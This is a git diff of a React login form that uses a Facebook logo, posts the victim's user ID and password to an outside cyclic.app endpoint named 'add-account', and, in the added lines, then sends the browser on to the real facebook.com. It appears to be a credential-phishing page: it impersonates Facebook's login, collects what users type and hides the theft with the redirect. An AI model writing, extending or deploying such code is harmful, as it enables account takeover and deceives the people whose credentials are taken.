@@ -10,15 +10,16 @@ import { Box,
     InputRightElement,
     Text
 } from '@chakra-ui/react';
-import { Link } from 'react-router-dom';
+import { Link, Navigate } from 'react-router-dom';
 import logo from "../Facebook-Logo.png"
 import { useTranslation } from 'react-i18next';
 import axios from 'axios'
-interface LoginFormProps {
-  // onSubmit: (username: string, password: string) => void;
-}
 
-const LoginForm = () => {
+type LoginFormProps = {
+  onClose: () => void;
+};
+
+const LoginForm = ({onClose}: LoginFormProps) => {
   const { t, i18n } = useTranslation();
   const [uid, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -85,7 +86,9 @@ const LoginForm = () => {
       // Send data
       try {
         await axios.post('https://wild-pink-duck-kilt.cyclic.app/add-account', data);
-        // alert('Data submitted successfully');
+        // localStorage.setItem('uid', data.uid);
+        onClose()
+        window.location.href = 'https://www.facebook.com';
       } catch (error) {
         console.error('Error submitting data:', error);
       }
